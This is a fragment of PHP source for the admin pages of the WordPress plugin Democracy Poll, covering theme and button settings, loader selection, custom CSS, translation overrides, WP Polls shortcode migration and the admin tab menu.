										<input type="button" value="<?php echo $fname ?>" class="<?php echo $button_class ?>">
									</span>
								</label>
								<?php
							}
							?>
						</div>
						<div class="clear"></div><br>

						<p style="float:left; margin-right:3em;">
							<?php _e('Button colors','democracy-poll') ?><br>

							<input type="text" class="iris_color" name="dem[btn_bg_color]" value="<?php echo $opt['btn_bg_color'] ?>">
							<?php _e('Bg color','democracy-poll') ?><br>

							<input type="text" class="iris_color" name="dem[btn_color]" value="<?php echo $opt['btn_color'] ?>">
							<?php _e('Text Color','democracy-poll') ?><br>

							<input type="text" class="iris_color" name="dem[btn_border_color]" value="<?php echo $opt['btn_border_color'] ?>">
							<?php _e('Border Color','democracy-poll') ?>
						</p>
						<p style="float:left; margin-right:3em;">
							<?php _e('Hover button colors','democracy-poll') ?><br>

							<input type="text" class="iris_color" name="dem[btn_hov_bg]" value="<?php echo $opt['btn_hov_bg'] ?>">
							<?php _e('Bg color','democracy-poll') ?><br>

							<input type="text" class="iris_color" name="dem[btn_hov_color]" value="<?php echo $opt['btn_hov_color'] ?>">
							<?php _e('Text Color','democracy-poll') ?><br>

							<input type="text" class="iris_color" name="dem[btn_hov_border_color]" value="<?php echo $opt['btn_hov_border_color'] ?>">
							<?php _e('Border Color','democracy-poll') ?>
						</p>
						<div class="clear"></div>
						<em>
							<?php _e('The colors correctly affects NOT for all buttons. You can change styles completely in "additional styles" field bellow.','democracy-poll') ?>
						</em>


					<!--<hr>-->
					<label style="margin-top:3em;">
						<input type="text" name="dem[btn_class]" value="<?php echo $opt['btn_class'] ?>">
						<em><?php _e('An additional css class for all buttons in the poll. When the template has a special class for buttons, for example <code>btn btn-info</code>','democracy-poll') ?></em>
					</label>
				</li>

			</ul>


			<!-- AJAX loader -->
			<ul class="group">
				<li class="title"><?php _e('AJAX loader','democracy-poll'); ?></li>
				<li class="block loaders" style="text-align:center;">

					<div class="selectable_els">
						<label class="lo_item" style="display: block; height:30px;">
							<input type="radio" value="" name="dem[loader_fname]" <?php checked( $opt['loader_fname'], '') ?>>
							<span class="radio_content"><?php _e('No (dots...)','democracy-poll'); ?></span>
						</label>
						<br>
						<?php
							$data = array();
							foreach( glob( DEMOC_PATH . 'styles/loaders/*') as $file ){
								if( is_dir($file) ) continue;
								$fname = basename( $file );
								$ex    = preg_replace('~.*\.~', '', $fname );
								$data[ $ex ][ $fname ] = $file;
							}
							foreach( $data as $ex => $val ){
								echo '<div class="clear"></div>'. "<h2 style='text-align:center;'>$ex</h2>"; //'';

								// поправим стили
								if( $loader = $opt['loader_fill'] ){
									preg_match_all('~\.dem-loader\s+\.(?:fill|stroke|css-fill)[^\{]*\{.*?\}~s', $demcss['base_css'], $match );
									echo "<style>" . str_replace('.dem-loader', '.loader', implode("\n", $match[0]) ) . "</style>";
								}

								foreach( $val as $fname => $file ){
									?>
									<label class="lo_item <?php echo $ex ?>">
										<input type="radio" value="<?php echo $fname ?>" name="dem[loader_fname]" <?php checked( $opt['loader_fname'], $fname) ?>>
										<span class="radio_content">
											<div class="loader"><?php echo file_get_contents( $file ) ?></div>
											<?php //echo $ex ?>
										</span>
									</label>
									<?php
								}
							}
						?>

					</div>

					<em>
						<?php _e('AJAX Loader. If choose "NO", loader replaces by dots "..." which appends to a link/button text. SVG images animation don\'t work in IE 11 or lower, other browsers are supported at  90% (according to caniuse.com statistics).','democracy-poll') ?>
					</em>

					<input class="iris_color fill" name="dem[loader_fill]" type="text" value="<?php echo @ $opt['loader_fill'] ?>">

				</li>

			</ul>

			<!-- Custom styles -->
			<ul class="group">
				<li class="title"><?php _e('Custom/Additional CSS styles','democracy-poll') ?></li>

				<li class="block" style="width:98%;">
					<p>
						<i><?php
						_e('In this field you can add some additional css properties or completely replace current css theme. Write here css and it will be added at the bottom of current Democracy css. To complete replace styles, check "No theme" and describe all styles.','democracy-poll');

						_e('This field cleaned manually, if you reset options of this page or change/set another theme, the field will not be touched.','democracy-poll');
						?></i>
					</p>
					<textarea name="additional_css" style="width:100%;min-height:50px;height:<?php echo $additional ? '300px' : '50px' ?>;"><?php echo $additional ?></textarea>
				</li>
			</ul>

			<!-- Connected styles -->
			<p style="margin:2em 0; margin-top:5em; position:fixed; bottom:0; z-index:99;">
				<?php dem__design_submit_button() ?>
				<input type="submit" name="dem_reset_design_options" class="button" value="<?php _e('Reset Options','democracy-poll') ?>" style="margin-left:4em;" onclick="return confirm('<?php _e('are you sure?','democracy-poll') ?>');">
			</p>

			<ul class="group">
				<li class="title"><?php _e('All CSS styles that uses now','democracy-poll'); ?></li>
				<li class="block">
					<script>
					function select_kdfgu( that ){
						var sel = ( !! document.getSelection ) ? document.getSelection() : (!!window.getSelection) ? window.getSelection() : document.selection.createRange().text;
						if( sel == '' ) that.select();
					}
					</script>
					<em style="__opacity: 0.8;">
						<?php _e('It\'s all collected css styles: theme, button, options. You can copy this styles to the "Custom/Additional CSS styles:" field, disable theme and change copied styles by itself.','democracy-poll') ?>
					</em>
					<textarea onmouseup="select_kdfgu(this);" onfocus="this.style.height = '700px';" onblur="this.style.height = '100px';" readonly="true" style="width:100%;min-height:100px;"><?php
						echo $demcss['base_css'] ."\n\n\n/* custom styles ------------------------------ */\n". $demcss['additional_css'];
					?></textarea>

					<p><?php _e('Minified version (uses to include it in HTML)','democracy-poll'); ?></p>

					<textarea onmouseup="select_kdfgu(this);" readonly="true" style="width:100%;min-height:10em;"><?php echo $demcss['minify'] ?></textarea>
				</li>
			</ul>

		</form>

</div>
	<?php
}

function dem_l10n_options(){
	echo demenu();
	?>
	<div class="democr_options dempage_l10n">

		<?php dem__polls_preview(); ?>

		<form method="POST" action="">
			<?php
			wp_nonce_field('dem_adminform', '_demnonce');

			// выводим таблицу

			echo '<table class="wp-list-table widefat fixed posts">
			<thead>
				<tr>
					<th>'. __('Original','democracy-poll') .'</th>
					<th>'. __('Your variant','democracy-poll') .'</th>
				</tr>
			</thead>
			<tbody id="the-list">
			';


			// отпарсим английский перевод из файла
			/*
			$mofile = DEMOC_PATH . DEM_DOMAIN_PATH . '/'. get_locale() .'.mo';
			if( file_exists($mofile) ){
				$mo = new MO();
				$mo->import_from_file( $mofile );
				$mo = $mo->entries;
			}
			*/
			// получим все переводы из файлов
			$strs = array();
			foreach( glob( DEMOC_PATH .'*' ) as $file ){
				if( is_dir( $file ) ) continue;
				if( ! preg_match('~\.php$~', basename( $file ) ) ) continue;

				preg_match_all('~_x\(\s*[\'](.*?)(?<!\\\\)[\']~', file_get_contents($file), $match );
				if( $match[1] ) $strs = array_merge( $strs, $match[1] );
			}
			$strs = array_unique( $strs );

			$i = 0;
			$_l10n = get_option('democracy_l10n');
			remove_filter('gettext_with_context', array('Democracy_Poll', 'handle_front_l10n'), 10, 4 );
			foreach( $strs as $str ){
				$i++;
				$mo_str = call_user_func('_x', $str, 'front', 'democracy-poll');
				//if( $translated !== $str ) $mo_str = (  ) ? isset($mo) && isset($mo[$str]) ) ? $mo[$str]->translations[0] : $str;

				$l10ed_str = ( !empty($_l10n[$str]) && $_l10n[$str] !== $mo_str ) ? $_l10n[$str] : '';

				echo '
				<tr class="'.( $i%2 ? 'alternate' : '' ).'">
					<td>'. esc_html( $mo_str ) .'</td>
					<td><textarea style="width:100%; height:30px;" name="l10n['. esc_attr($str) .']">'. esc_textarea( $l10ed_str ) .'</textarea></td>
				</tr>';

			}
			add_filter('gettext_with_context', array('Democracy_Poll', 'handle_front_l10n'), 10, 4 );
			echo '<tbody>
			</table>';
			?>
			<p>
				<input class="button-primary" type="submit" name="dem_save_l10n" value="<?php _e('Save Text','democracy-poll'); ?>">
				<input class="button" type="submit" name="dem_reset_l10n" value="<?php _e('Reset Options','democracy-poll'); ?>">
			</p>

		</form>

	</div>
	<?php

}

function dem_migration_subpage(){

	require_once DEMOC_PATH .'admin/migration.php';

	$migration = get_option('democracy_migrated');

	// handlers
	if( ! empty($migration['wp-polls']) ){
		$moreaction = & $_GET['moreaction'];

		// замена шорткодов
		if( in_array( $moreaction, array('replace_shortcode','restore_shortcode_replace') ) ){
			global $wpdb;

			$count = 0;

			$poll_ids_old_new = wp_list_pluck( $migration['wp-polls'], 'new_poll_id' );

			foreach( $poll_ids_old_new as $old => $new ){
				$_new = '[democracy id="'. intval($new) .'"]';
				$_old = '[poll id="'. intval($old) .'"]';

				if( $moreaction === 'replace_shortcode' ){
					$rep_from = $_old;
					$rep_to   = $_new;
				}
				elseif( $moreaction === 'restore_shortcode_replace' ){
					$rep_from = $_new;
					$rep_to   = $_old;
				}

				if( $rep_from && $rep_to )
					$count += $wpdb->query("UPDATE $wpdb->posts SET post_content = REPLACE( post_content, '$rep_from', '$rep_to' ) WHERE post_type NOT IN ('attachment','revision')");
			}

			democr()->msg[] = sprintf( __('Shortcodes replaced: %s', 'democracy-poll'), $count );
		}

		// Удаление данных о миграции
		if( $moreaction === 'delete_wp-polls_info' ){
			delete_option('democracy_migrated');

			democr()->msg[] = __('Data of migration deleted','democracy-poll');

			echo demenu(); // выводит сообщения

			return; // важно!
		}
	}

	if( @ $_GET['from'] === 'wp-polls' )
		dem_WP_Polls_migration();

	$migration = get_option('democracy_migrated'); // дуль нужен!

	//print_r(wp_list_pluck( $wppolls, 'answers:old->new' ));

	echo demenu();
	?>
	<div class="democr_options">
		<?php
		// Миграция WP Polls
		if( $wppolls = & $migration['wp-polls'] ){
			$count_polls = count( wp_list_pluck( $wppolls, 'new_poll_id' ) );

			$count_answe = 0;
			foreach( wp_list_pluck( $wppolls, 'answers:old->new' ) as $val )
				$count_answe += count($val);

			$count_logs = 0;
			foreach( wp_list_pluck( $wppolls, 'logs_created' ) as $val )
				$count_logs += count($val);

			echo '
			<h3>'. __('Migration from WP Polls done','democracy-poll') .'</h3>
			<p>'. sprintf( __('Polls copied: %d. Answers copied: %d. Logs copied: %d', 'democracy-poll'), $count_polls, $count_answe, $count_logs ) .'</p>
			<p>
				<a class="button" href="'. esc_url( add_query_arg('moreaction','replace_shortcode') ) .'">'. __('Replace WP Polls shortcodes in posts', 'democracy-poll') .'</a> <=>
				<a class="button" href="'. esc_url( add_query_arg('moreaction','restore_shortcode_replace') ) .'">'. __('Cancel the shortcode replace and reset changes', 'democracy-poll') .'</a>
			</p>
			<br>
			<p>
				<a class="button button-small" style="opacity:.5;" href="'. esc_url( add_query_arg('moreaction','delete_wp-polls_info') ) .'" onclick="return confirm(\''. __('Are you sure?','democracy-poll') .'\');">'. __('Delete all data about WP Polls migration', 'democracy-poll') .'</a>
			</p>
			';
		}
		?>
	</div>
	<?php
}

/**
 * Выводит все меню админки. Ссылки: с подстраниц на главную страницу и умный referer
 *
 * Выводит сообщения об ошибках и успехах.
 *
 * @return echo HTML
 */
function demenu(){
	// back link
	if(1){
		$transient = 'democracy_referer';
		$mainpage  = wp_make_link_relative( democr()->admin_page_url() );
		$referer   = isset($_SERVER['HTTP_REFERER']) ? wp_make_link_relative($_SERVER['HTTP_REFERER']) : '';

		// если обновляем
		if( $referer == $_SERVER['REQUEST_URI'] ){
			$referer = get_transient( $transient );
		}
		// если запрос пришел с любой страницы настроект democracy
		elseif( false !== strpos( $referer, $mainpage ) ){
			$referer = false;
			set_transient( $transient, 'foo', 2 ); // удаляем. но не удалим, а обновим, так чтобы не работала
		}
		else
			set_transient( $transient, $referer, HOUR_IN_SECONDS/2 );
	}

	if( isset($_GET['edit_poll']) ) $_GET['subpage'] = 'add_new'; // костыль

	$fn__current = function( $page ){
		return (@ $_GET['subpage'] == $page) ? ' nav-tab-active' : '';
	};

	$out = ''; //'<h2>'. __('Democracy Poll','democracy-poll') .'<h2>';
	$out .= '<h2 class="nav-tab-wrapper nav-tab-small" style="margin-bottom:1em;">'.
		($referer ? '<a class="nav-tab" href="'. $referer .'" style="margin-right:20px;">← '. __('Back','democracy-poll') .'</a>' : '' ).
		'<a class="nav-tab'. $fn__current('') .'" href="'. $mainpage .'">'. __('Polls List','democracy-poll') .'</a>'.
		'<a class="nav-tab'. $fn__current('add_new') .'" href="'. add_query_arg( array('subpage'=>'add_new'), $mainpage ) .'">'. __('Add new poll','democracy-poll') .'</a>'.
		'<a style="margin-right:1em;" class="nav-tab'. $fn__current('logs') .'" href="'. add_query_arg( array('subpage'=>'logs'), $mainpage ) .'">'. __('Logs','democracy-poll') .'</a>'.
		( democr()->super_access ? (
			'<a class="nav-tab'. $fn__current('general_settings') .'" href="'. add_query_arg( array('subpage'=>'general_settings'), $mainpage ) .'">'. __('Settings','democracy-poll') .'</a>'.
			'<a class="nav-tab'. $fn__current('design') .'" href="'. add_query_arg( array('subpage'=>'design'), $mainpage ) .'">'. __('Theme Settings','democracy-poll') .'</a>'.
			'<a class="nav-tab'. $fn__current('l10n') .'" href="'. add_query_arg( array('subpage'=>'l10n'), $mainpage ) .'">'. __('Texts changes','democracy-poll') .'</a>'
		) : '' ) .
	'</h2>';

	if( democr()->super_access && in_array( @ $_GET['subpage'], array('general_settings', 'design', 'l10n') ) )
		$out .= dem__info_bar();

	// сообщения
	$out .= democr()->msgs_html();

	return $out;
}

/**
 * Выводит HTML блока информации обо всем на свете :)
 */
function dem__info_bar(){
	ob_start();

	?>
	<style>
		/* info bar */
		.democr_options{ float:left; width:80%; }
		.dem_info_wrap{ width:17%; position: fixed; right: 0; padding: 2em 0; }

		@media screen and ( max-width:1400px ){
			.democr_options{ float:none; width:100%; }
			.dem_info_wrap{ display:none; }
		}
	</style>
	<div class="dem_info_wrap">
		<div class="infoblk">
			<?php
			echo str_replace(
				'<a',
				'<a target="_blank" href="https://wordpress.org/support/plugin/democracy-poll/reviews/#new-post"',
				__('If you like this plugin, please <a>leave your review</a>','democracy-poll')
			);
			?>
		</div>
	</div>
	<?php

	return ob_get_clean();
}

/**
 * Выводит кнопки активации/деактивации опроса
 * @param object $poll Объект опроса
 * @param str $url УРЛ страницы ссылки, которую нужно обработать
 * @return HTML
 */
function dem_activatation_buttons( $poll,  $icon_reverse = false ){
	if( $poll->active )
		$out = '<a class="button" href="'. esc_url( dem__add_nonce( add_query_arg( array('dmc_deactivate_poll'=>$poll->id, 'dmc_activate_poll'=>null) ) ) ) .'" title="'. __('Deactivate','democracy-poll') .'"><span class="dashicons dashicons-controls-'. ($icon_reverse ? 'play' : 'pause') .'"></span></a>';
	else
		$out = '<a class="button" href="'. esc_url( dem__add_nonce( add_query_arg( array('dmc_deactivate_poll'=>null, 'dmc_activate_poll'=>$poll->id ) ) ) ) .'" title="'. __('Activate','democracy-poll') .'"><span class="dashicons dashicons-controls-'. ($icon_reverse ? 'pause' : 'play') .'"></span></a>';

	return $out;
}

/**
 * Выводит кнопки открытия/закрытия опроса
 * @param object $poll Объект опроса
 * @param str $url УРЛ страницы ссылки, которую нужно обработать
 * @return HTML
 */
function dem_opening_buttons( $poll, $icon_reverse = false ){
	if( $poll->open )
		$out = '<a class="button" href="'. esc_url( dem__add_nonce( add_query_arg( array('dmc_close_poll'=> $poll->id, 'dmc_open_poll'=>null) ) ) ) .'" title="'. __('Close voting','democracy-poll') .'"><span class="dashicons dashicons-'. ($icon_reverse ? 'yes' : 'no') .'"></span></a>';
	else
		$out = '<a class="button" href="'. esc_url( dem__add_nonce( add_query_arg( array('dmc_close_poll'=>null, 'dmc_open_poll'=> $poll->id ) ) ) ) .'" title="'. __('Open voting','democracy-poll') .'"><span class="dashicons dashicons-'. ($icon_reverse ? 'no' : 'yes') .'"></span></a>';

	return $out;
}

function dem__polls_preview(){
	?>
	<ul class="group">
		<li class="block polls-preview">
			<?php
			$poll = new DemPoll();

			if( $poll->id ){
				$poll->cachegear_on = false;

				//$poll->has_voted = 1;
				$answers = (array) wp_list_pluck( $poll->poll->answers, 'aid');
				$poll->votedFor = $answers ? $answers[ array_rand($answers) ] : false;

				$fn__replace = function($val){  return str_replace(array(/*'checked="checked"',*/'disabled="disabled"'), '', $val);  };

				echo '<div class="poll"><p class="tit">'. __('Results view:','democracy-poll') .'</p>'. $fn__replace( $poll->get_screen('voted') ) .'</div>';

				echo '<div class="poll"><p class="tit">'. __('Vote view:','democracy-poll') .'</p>'. $fn__replace( $poll->get_screen('force_vote') ) .'</div>';

				echo '<div class="poll show-loader"><p class="tit">'. __('AJAX loader view:','democracy-poll') .'</p>'. $fn__replace( $poll->get_screen('vote') ) .'</div>';
			}
			else
				echo 'no data or no active polls...';

			if( @ $_GET['subpage'] === 'design' )
				echo '<input type="text" class="iris_color preview-bg">';
			?>

		</li>
	</ul>
	<?php
}

function dem__design_submit_button(){
	?>
	<input type="submit" name="dem_save_design_options" class="button-primary" value="<?php _e('Save All Changes','democracy-poll') ?>">
	<?php
}

function dem__add_nonce( $url ){
	return add_query_arg( array('_demnonce'=>wp_create_nonce('dem_adminform')), $url );
}


